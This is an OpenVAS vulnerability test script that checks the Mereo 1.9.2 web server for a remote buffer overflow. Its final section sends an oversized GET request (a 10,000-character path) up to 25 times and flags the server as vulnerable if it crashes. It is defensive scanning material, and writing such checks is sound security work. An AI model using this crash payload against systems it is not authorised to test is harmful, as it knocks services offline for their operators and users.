###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mereo_42839.nasl 8244 2017-12-25 07:29:28Z teissa $
#
# Mereo 'GET' Request Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mereo is prone to a remote buffer-overflow vulnerability because it
fails to perform adequate boundary checks on user-supplied input
before copying it to an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within
the context of the affected application. Failed exploit attempts will
result in a denial-of-service condition.

Mereo 1.9.2 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100776");
 script_version("$Revision: 8244 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-25 08:29:28 +0100 (Mon, 25 Dec 2017) $");
 script_tag(name:"creation_date", value:"2010-09-02 16:10:00 +0200 (Thu, 02 Sep 2010)");
 script_bugtraq_id(42839);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("Mereo 'GET' Request Remote Buffer Overflow Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/42839");
 script_xref(name : "URL" , value : "http://www.assembla.com/spaces/mereo/wiki?id=bMd54a1Xer3OfueJe5aVNr");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Buffer overflow");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

if(safe_checks())exit(0);

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if("Server:" >< banner)exit(0);

if(http_is_dead(port:port))exit(0);

url = string("/",crap(data:"X",length:10000));

for(i=0;i<25;i++) {
  
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }  
}

exit(0);
